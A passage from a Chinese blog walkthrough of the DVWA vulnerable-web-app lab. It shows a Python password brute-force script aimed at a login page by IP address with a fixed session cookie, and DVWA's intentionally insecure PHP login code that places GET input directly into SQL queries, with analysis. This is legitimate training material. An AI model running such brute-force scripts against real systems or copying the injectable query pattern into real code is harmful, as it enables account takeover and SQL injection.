<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>DVWA靶场通关和源码分析 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="DVWA靶场通关和源码分析" />
<meta property="og:description" content="文章目录 一、Brute Force1.low2、medium3、High4、Impossible 二、Command Injection1、Low2、Medium3、High 三、CSRF1、Low2、Medium3、High4、Impossible 四、File Inclusion1、Low2、Medium3、High 五、File Upload1、Low2、Medium3、High4、Impossible 六、 SQL注入1、Low2、Medium3、High4、Impossible 七、SQL盲注1、Low2、Medium3、High4、Impossible 八、Weak Session IDs1、Low2、Medium3、High4、Impossible 九、XSS(DOM）1、Low2、Medium3、High4、Impossible 十、XSS（Reflected）1、Low2、Medium3、High4、Impossiblle 十一、XSS（Stored）1、Low2、Medium3、High4、Impossible 十二、 CSP Bypass1、Low2、Medium3、High4、Impossible 十三、JavaScript1、Low2、Medium3、High 一、Brute Force 1.low 简单爆破脚本：
import requests s = requests.session() headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#39;, &#39;Cookie&#39;: &#39;PHPSESSID=02t5fg1bf27dpm9lk6il83b8k7; security=low&#39; } f = open(&#39;password.txt&#39;, &#39;r&#39;,encoding=&#39;utf-8&#39;) while 1: password=f.readline().rstrip() if not password or not password: break url = f&#39;http://121.40.115.95/vulnerabilities/brute/?username=admin&amp;password={password}&amp;Login=Login#&#39; resp = s.get(url, headers=headers) if &#39;Username and/or password incorrect." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/97627f5ccc7ce91202179a514c08b5ab/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-09T14:29:34+08:00" />
<meta property="article:modified_time" content="2023-02-09T14:29:34+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">DVWA靶场通关和源码分析</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#Brute_Force_2" rel="nofollow">一、Brute Force</a></li><li><ul><li><a href="#1low_3" rel="nofollow">1.low</a></li><li><a href="#2medium_66" rel="nofollow">2、medium</a></li><li><a href="#3High_109" rel="nofollow">3、High</a></li><li><a href="#4Impossible_164" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#Command_Injection_274" rel="nofollow">二、Command Injection</a></li><li><ul><li><a href="#1Low_275" rel="nofollow">1、Low</a></li><li><a href="#2Medium_305" rel="nofollow">2、Medium</a></li><li><a href="#3High_345" rel="nofollow">3、High</a></li></ul> 
  </li><li><a href="#CSRF_394" rel="nofollow">三、CSRF</a></li><li><ul><li><a href="#1Low_395" rel="nofollow">1、Low</a></li><li><a href="#2Medium_434" rel="nofollow">2、Medium</a></li><li><a href="#3High_479" rel="nofollow">3、High</a></li><li><a href="#4Impossible_556" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#File_Inclusion_613" rel="nofollow">四、File Inclusion</a></li><li><ul><li><a href="#1Low_614" rel="nofollow">1、Low</a></li><li><a href="#2Medium_626" rel="nofollow">2、Medium</a></li><li><a href="#3High_645" rel="nofollow">3、High</a></li></ul> 
  </li><li><a href="#File_Upload_668" rel="nofollow">五、File Upload</a></li><li><ul><li><a href="#1Low_669" rel="nofollow">1、Low</a></li><li><a href="#2Medium_700" rel="nofollow">2、Medium</a></li><li><a href="#3High_743" rel="nofollow">3、High</a></li><li><a href="#4Impossible_793" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#_SQL_863" rel="nofollow">六、 SQL注入</a></li><li><ul><li><a href="#1Low_864" rel="nofollow">1、Low</a></li><li><a href="#2Medium_908" rel="nofollow">2、Medium</a></li><li><a href="#3High_949" rel="nofollow">3、High</a></li><li><a href="#4Impossible_963" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#SQL_1036" rel="nofollow">七、SQL盲注</a></li><li><ul><li><a href="#1Low_1037" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1138" rel="nofollow">2、Medium</a></li><li><a href="#3High_1178" rel="nofollow">3、High</a></li><li><a href="#4Impossible_1274" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#Weak_Session_IDs_1348" rel="nofollow">八、Weak Session IDs</a></li><li><ul><li><a href="#1Low_1349" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1371" rel="nofollow">2、Medium</a></li><li><a href="#3High_1389" rel="nofollow">3、High</a></li><li><a href="#4Impossible_1412" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#XSSDOM_1428" rel="nofollow">九、XSS(DOM）</a></li><li><ul><li><a href="#1Low_1429" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1450" rel="nofollow">2、Medium</a></li><li><a href="#3High_1476" rel="nofollow">3、High</a></li><li><a href="#4Impossible_1505" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#XSSReflected_1524" rel="nofollow">十、XSS（Reflected）</a></li><li><ul><li><a href="#1Low_1525" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1547" rel="nofollow">2、Medium</a></li><li><a href="#3High_1571" rel="nofollow">3、High</a></li><li><a href="#4Impossiblle_1596" rel="nofollow">4、Impossiblle</a></li></ul> 
  </li><li><a href="#XSSStored_1623" rel="nofollow">十一、XSS（Stored）</a></li><li><ul><li><a href="#1Low_1624" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1656" rel="nofollow">2、Medium</a></li><li><a href="#3High_1691" rel="nofollow">3、High</a></li><li><a href="#4Impossible_1725" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#_CSP_Bypass_1764" rel="nofollow">十二、 CSP Bypass</a></li><li><ul><li><a href="#1Low_1765" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1800" rel="nofollow">2、Medium</a></li><li><a href="#3High_1836" rel="nofollow">3、High</a></li><li><a href="#4Impossible_1912" rel="nofollow">4、Impossible</a></li></ul> 
  </li><li><a href="#JavaScript_1927" rel="nofollow">十三、JavaScript</a></li><li><ul><li><a href="#1Low_1928" rel="nofollow">1、Low</a></li><li><a href="#2Medium_1936" rel="nofollow">2、Medium</a></li><li><a href="#3High_1943" rel="nofollow">3、High</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="Brute_Force_2"></a>一、Brute Force</h2> 
<h3><a id="1low_3"></a>1.low</h3> 
<p>简单爆破脚本：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'</span><span class="token punctuation">,</span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=02t5fg1bf27dpm9lk6il83b8k7; security=low'</span>
<span class="token punctuation">}</span>

f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'password.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    password<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> password <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://121.40.115.95/vulnerabilities/brute/?username=admin&amp;password=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>password<span class="token punctuation">}</span></span><span class="token string">&amp;Login=Login#'</span></span>
    resp <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'Username and/or password incorrect.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre> 
<p>源码分析：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get username</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Get password</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check the database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `users` WHERE user = '<span class="token interpolation"><span class="token variable">$user</span></span>' AND password = '<span class="token interpolation"><span class="token variable">$pass</span></span>';"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Get users details</span>
		<span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// Login successful</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;Welcome to the password protected area <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$user</span><span class="token punctuation">}</span></span>&lt;/p&gt;"</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$avatar</span><span class="token punctuation">}</span></span>\" /&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Login failed</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>从GET请求中获取username和password，password用md5加密后直接放入数据库查询，有结果则将查询到的avatar字段数据提取出来，应该是对应某个图片名称，然后放出图片。</p> 
</blockquote> 
<h3><a id="2medium_66"></a>2、medium</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Sanitise username input</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise password input</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check the database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `users` WHERE user = '<span class="token interpolation"><span class="token variable">$user</span></span>' AND password = '<span class="token interpolation"><span class="token variable">$pass</span></span>';"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Get users details</span>
		<span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// Login successful</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;Welcome to the password protected area <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$user</span><span class="token punctuation">}</span></span>&lt;/p&gt;"</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$avatar</span><span class="token punctuation">}</span></span>\" /&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Login failed</span>
		<span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>仅仅只是在GET请求获取的username和password处增加了mysqli_real_escape_string(）的处理，转义sql语句中的字符，防止sql注入，对暴力破解依旧没有防备。</p> 
</blockquote> 
<h3><a id="3High_109"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise username input</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise password input</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `users` WHERE user = '<span class="token interpolation"><span class="token variable">$user</span></span>' AND password = '<span class="token interpolation"><span class="token variable">$pass</span></span>';"</span><span class="token punctuation">;</span>
